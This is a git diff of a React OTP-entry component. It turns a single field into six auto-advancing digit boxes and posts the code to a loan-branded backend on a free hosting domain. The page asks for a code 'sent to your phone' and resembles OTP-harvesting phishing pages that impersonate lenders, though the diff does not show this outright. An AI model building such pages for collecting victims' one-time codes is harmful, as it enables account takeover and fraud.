@@ -1,51 +1,82 @@
 import { useState } from "react";
 import { useParams } from "react-router-dom";
 import axios from "axios";
+import "../styles/app.css";
 
 export default function OTP() {
   const { id } = useParams();
 
-  const [otp, setOtp] = useState("");
-  const [loading, setLoading] = useState(false);
+  // ✅ allow up to 6 digits
+  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
 
-  const submitOTP = async () => {
-    if (!otp) {
-      alert("Enter OTP");
+  const handleChange = (value, index) => {
+    if (isNaN(value)) return;
+
+    const newOtp = [...otp];
+    newOtp[index] = value;
+    setOtp(newOtp);
+
+    // move to next input
+    if (value && index < otp.length - 1) {
+      document.getElementById(`otp-${index + 1}`).focus();
+    }
+  };
+
+  const handleSubmit = async () => {
+    const code = otp.join("").trim();
+
+    if (code.length < 5) {
+      alert("Enter valid OTP");
       return;
     }
 
     try {
-      setLoading(true);
+      await axios.post(
+        "https://g-bayport-loans.onrender.com/apply/otp",
+        {
+          id,
+          otp: code,
+        }
+      );
 
-      await axios.post("http://localhost:5000/apply/otp", {
-        id,
-        otp,
-      });
+      alert("OTP submitted!");
+      window.location.href = "/status";
 
-      alert("OTP submitted. Waiting for approval...");
     } catch (err) {
-      alert("Error submitting OTP");
-    } finally {
-      setLoading(false);
+      console.error(err);
+      alert("Error sending OTP");
     }
   };
 
   return (
-    <div className="container">
-      <h2>Enter OTP</h2>
+    <div className="loan-container">
+      <div className="card otp-container">
 
-      <p>Application ID: {id}</p>
+        <div className="header">
+          <img src="/icon.jpeg" alt="logo" className="logo" />
+          <h1>Verify OTP</h1>
+          <p className="subtitle">
+            Enter the code sent to your phone
+          </p>
+        </div>
 
-      <input
-        type="number"
-        placeholder="Enter OTP"
-        value={otp}
-        onChange={(e) => setOtp(e.target.value)}
-      />
+        <div className="otp-inputs">
+          {otp.map((digit, index) => (
+            <input
+              key={index}
+              id={`otp-${index}`}
+              maxLength="1"
+              value={digit}
+              onChange={(e) => handleChange(e.target.value, index)}
+            />
+          ))}
+        </div>
 
-      <button onClick={submitOTP} disabled={loading}>
-        {loading ? "Submitting..." : "Submit OTP"}
-      </button>
+        <button className="btn" onClick={handleSubmit}>
+          Submit OTP
+        </button>
+
+      </div>
     </div>
   );
 }
